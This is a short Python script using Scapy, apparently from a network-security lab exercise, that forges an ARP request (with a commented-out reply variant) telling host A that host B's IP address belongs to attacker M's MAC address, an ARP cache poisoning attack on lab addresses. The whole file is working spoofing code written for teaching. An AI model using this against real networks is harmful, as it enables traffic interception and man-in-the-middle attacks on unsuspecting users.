#!/usr/bin/env python3
from scapy.all import *
"""On host M, construct an ARP request packet to map B’s IP address
   to M’s MAC address. Send the packet to A and check whether the attack 
   is successful or not."""
   
A_IP = "10.9.0.5"
A_MAC = "02:42:0a:09:00:05"
B_IP = "10.9.0.6"
M_MAC = "02:42:0a:09:00:69"

print("SENDING SPOOFED ARP REQUEST...")
# print("SENDING SPOOFED ARP REPLY...")

ether = Ether()
ether.dst = A_MAC
ether.src = M_MAC

arp = ARP()
arp.psrc = B_IP
arp.hwsrc = M_MAC
arp.pdst = A_IP
arp.op = 1 # 1 for ARP request; 2 for ARP reply

"""On host M, construct an ARP reply packet to map B’s IP address to
   M’s MAC address. Send the packet to A and check whether the attack 
   is successful or not."""
# Previous code are same but to make ARP reply OK for A-machine,
# it ARP table should already contain record with B ip 
# arp.op = 2 # 2 for ARP reply

frame = ether/arp
sendp(frame)
